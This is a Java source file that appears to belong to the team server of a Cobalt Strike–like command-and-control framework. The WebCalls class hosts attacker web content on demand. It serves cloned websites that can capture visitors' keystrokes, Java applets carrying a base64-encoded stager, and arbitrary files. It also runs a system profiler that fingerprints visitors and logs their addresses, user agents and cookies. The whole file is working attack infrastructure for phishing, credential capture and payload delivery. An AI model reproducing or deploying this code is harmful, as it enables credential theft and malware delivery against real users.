package server;

import c2profile.Profile;
import cloudstrike.*;
import common.*;
import profiler.SystemProfiler;

import java.io.File;
import java.io.IOException;
import java.util.*;

public class WebCalls implements ServerHook,
        WebServer.WebListener {
    protected Map servers = new HashMap();
    protected Resources resources;

    @Override
    public void register(HashMap<String, Object> calls) {
        calls.put("cloudstrike.host_file", this);
        calls.put("cloudstrike.host_site", this);
        calls.put("cloudstrike.host_data", this);
        calls.put("cloudstrike.start_profiler", this);
        calls.put("cloudstrike.host_applet", this);
        calls.put("cloudstrike.kill_site", this);
        calls.put("cloudstrike.clone_site", this);
    }

    public WebCalls(Resources r) {
        this.resources = r;
        this.broadcastSiteModel();
    }

    public List buildSiteModel() {
        LinkedList<Map> results = new LinkedList<>();
        synchronized (this) {
            for (Object o : this.servers.entrySet()) {
                Map.Entry entry = (Map.Entry) o;
                WebServer w = (WebServer) entry.getValue();
                List s = w.sites();
                for (Object value : s) {
                    Map<String,String> row = (Map) value;
                    row.put("Port", entry.getKey() + "");
                    results.add(row);
                }
            }
        }
        return results;
    }

    public void broadcastSiteModel() {
        this.resources.broadcast("sites", this.buildSiteModel(), true);
    }

    @Override
    public void receivedClient(String uri, String method, Properties header, Properties param, String handler, boolean primary, String response, long size) {
        String addr = (header.get("REMOTE_ADDRESS") + "").substring(1);
        String ua = header.get("User-Agent") + "";
        String id = param.get("id") + "";
        String cookie = header.get("Cookie") + "";
        this.resources.broadcast("weblog", new WebEvent(method, uri, addr, ua, "unknown", handler, new HashMap<>(param), response, size));
    }

    public WebServer getWebServer(int port) throws IOException {
        synchronized (this) {
            if (!this.servers.containsKey(port + "")) {
                WebServer server = new WebServer(port);
                server.addWebListener(this);
                this.servers.put(port + "", server);
                return server;
            }
            WebServer result = (WebServer) this.servers.get(port + "");
            if (result.isSSL()) {
                throw new IOException("Web server bound to " + port + " is SSL");
            }
            return result;
        }
    }

    public WebServer getSecureWebServer(int port) throws IOException {
        synchronized (this) {
            if (!this.servers.containsKey(port + "")) {
                Profile c2profile = ServerUtils.getProfile(this.resources);
                WebServer server = new WebServer(port, true, c2profile.getSSLKeystore(), c2profile.getSSLPassword());
                server.addWebListener(this);
                this.servers.put(port + "", server);
                return server;
            }
            WebServer result = (WebServer) this.servers.get(port + "");
            if (!result.isSSL()) {
                throw new IOException("Web server bound to " + port + " is not SSL");
            }
            return result;
        }
    }

    public boolean isServing(int port) {
        synchronized (this) {
            return this.servers.containsKey(port + "");
        }
    }

    public void host_file(Request r, ManageUser client) {
        File resource = new File(r.arg(4) + "");
        String type = r.arg(5) + "";
        if (!CommonUtils.isSafeFile(new File("uploads"), resource)) {
            CommonUtils.print_error(client.getNick() + " attempted to host " + resource + " (unsafe)");
            client.writeNow(r.reply("Failed: File '" + resource + "' is not in uploads."));
            return;
        }
        if (!resource.exists()) {
            client.writeNow(r.reply("Failed: File '" + resource + "' does not exist.\nI can't host it."));
            return;
        }
        if (!resource.canRead()) {
            client.writeNow(r.reply("Failed: I can't read the file. How can I serve it?"));
            return;
        }
        ServeFile hook = new ServeFile(resource, type);
        this.finishWebCall2(r, client, "file " + resource, hook);
    }

    public void host_site(Request r, ManageUser client) {
        String data = r.arg(4) + "";
        String capture = r.arg(5) + "";
        String desc = r.arg(6) + "";
        String cloneme = r.arg(7) + "";
        if ("true".equals(capture)) {
            KeyLogger hook = new KeyLogger(data, "text/html", desc);
            hook.addKeyloggerListener(new KeyloggerHandler(this.resources, cloneme));
            this.finishWebCall2(r, client, "cloned site: " + cloneme, hook);
        } else {
            StaticContent hook = new StaticContent(data, "text/html", desc);
            this.finishWebCall2(r, client, "cloned site: " + cloneme, hook);
        }
    }

    public void host_data(Request r, ManageUser client) {
        String data = r.arg(4) + "";
        String type = r.arg(5) + "";
        String desc = r.arg(6) + "";
        StaticContent hook = new StaticContent(data, type, desc);
        this.finishWebCall2(r, client, desc, hook);
    }

    public void host_applet(Request r, ManageUser client) {
        byte[] applet = (byte[]) r.arg(4);
        String b64stager = r.arg(5) + "";
        String clazz = r.arg(6) + "";
        String title = r.arg(7) + "";
        ServeApplet hook = new ServeApplet(applet, b64stager, new byte[0], title, clazz);
        this.finishWebCall2(r, client, title, hook);
    }

    protected void finishWebCall2(Request r, ManageUser client, String desc, WebService hook) {
        String host = r.arg(0) + "";
        int port = (Integer) r.arg(1);
        boolean ssl = (Boolean) r.arg(2);
        String uri = r.arg(3) + "";
        String proto = ssl ? "https://" : "http://";
        try {
            synchronized (this) {
                WebServer server = ssl ? this.getSecureWebServer(port) : this.getWebServer(port);
                server.associate(uri, host);
                hook.setup(server, uri);
            }
            client.writeNow(r.reply("success"));
            this.broadcastSiteModel();
            this.resources.broadcast("eventlog", LoggedEvent.NewSite(client.getNick(), proto + host + ":" + port + uri, desc));
        } catch (Exception ioex) {
            MudgeSanity.logException(desc + ": " + uri, ioex, true);
            client.writeNow(r.reply("Failed: " + ioex.getMessage()));
        }
    }

    public void start_profiler(Request r, ManageUser client) {
        String redir = r.argz(4);
        String java = r.argz(5);
        String desc = r.argz(6);
        if (redir != null) {
            SystemProfiler profiler = new SystemProfiler(redir, desc, java);
            profiler.addProfileListener(new ProfileHandler(this.resources));
            this.finishWebCall2(r, client, "system profiler", profiler);
        } else {
            SystemProfiler profiler = new SystemProfiler(desc, java);
            profiler.addProfileListener(new ProfileHandler(this.resources));
            this.finishWebCall2(r, client, "system profiler", profiler);
        }
    }

    public void kill_site(Request r, ManageUser client) {
        int port = Integer.parseInt(r.arg(0) + "");
        String uri = r.arg(1) + "";
        this.deregister(port, uri);
    }

    public void deregister(int port, String hook) {
        synchronized (this) {
            if (!this.isServing(port)) {
                return;
            }
            WebServer web = (WebServer) this.servers.get(port + "");
            if (web != null && web.deregister(hook)) {
                this.servers.remove(port + "");
            }
            this.broadcastSiteModel();
        }
    }

    @Override
    public void call(Request r, ManageUser client) {
        if (r.is("cloudstrike.host_file", 6)) {
            this.host_file(r, client);
        } else if ("cloudstrike.kill_site".equals(r.getCall()) && r.size() == 2) {
            this.kill_site(r, client);
        } else if (r.is("cloudstrike.host_data", 7)) {
            this.host_data(r, client);
        } else if (r.is("cloudstrike.start_profiler", 7)) {
            this.start_profiler(r, client);
        } else if (r.is("cloudstrike.clone_site", 1)) {
            new WebsiteCloneTool(r, client);
        } else if (r.is("cloudstrike.host_site", 8)) {
            this.host_site(r, client);
        } else if (r.is("cloudstrike.host_applet", 8)) {
            this.host_applet(r, client);
        } else {
            client.writeNow(new Reply("server_error", 0L, r + ": incorrect number of arguments"));
        }
    }
}

